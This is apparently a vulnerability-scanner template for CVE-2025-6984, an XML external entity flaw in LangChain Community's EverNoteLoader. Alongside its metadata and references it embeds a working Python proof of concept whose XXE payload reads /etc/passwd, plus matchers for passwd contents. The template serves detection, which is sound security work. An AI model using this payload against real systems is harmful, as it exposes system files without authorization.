id: CVE-2025-6984

info:
  name: "Langchain Community EverNoteLoader XXE (CVE-2025-6984)"
  author: nukunga[seunghyeonJeon]
  severity: high
  description: |
    The langchain-ai/langchain project, specifically the EverNoteLoader component, is vulnerable to
    XML External Entity (XXE) attacks due to insecure XML parsing. The vulnerability arises from the
    use of etree.iterparse() without disabling external entity references, which can lead to sensitive
    information disclosure. An attacker could exploit this by crafting a malicious XML payload that
    references local files, potentially exposing sensitive data such as /etc/passwd.
  reference:
    - "https://nvd.nist.gov/vuln/detail/CVE-2025-6984"
    - "https://huntr.com/bounties/a6b521cf-258c-41c0-9edb-d8ef976abb2a"
    - "https://github.com/langchain-ai/langchain-community/commit/e842452"
  classification:
    cvss-metrics: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    cvss-score: 7.5
    cve-id: "CVE-2025-6984"
    cwe-id: "CWE-200,CWE-611"
  tags: cve,cve2025,langchain,xxe,xml,file-disclosure

self-contained: true

code:
  - engine:
      - py
      - python3

    source: |
      #!/usr/bin/env python3
      import tempfile
      import os
      from langchain_community.document_loaders import EverNoteLoader

      if __name__ == "__main__":
          # Create XXE payload
          xxe_payload = '''<?xml version="1.0" ?>
      <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
      <note>
          <content>&example;</content>
      </note>'''

          # Write payload to temporary file
          with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
              f.write(xxe_payload)
              temp_file = f.name

          try:
              loader = EverNoteLoader(temp_file)
              print(loader.load())
          finally:
              os.unlink(temp_file)

    matchers:
      - type: word
        part: response
        words:
          - "root:"
          - "bin:"
          - "daemon:"
        condition: or
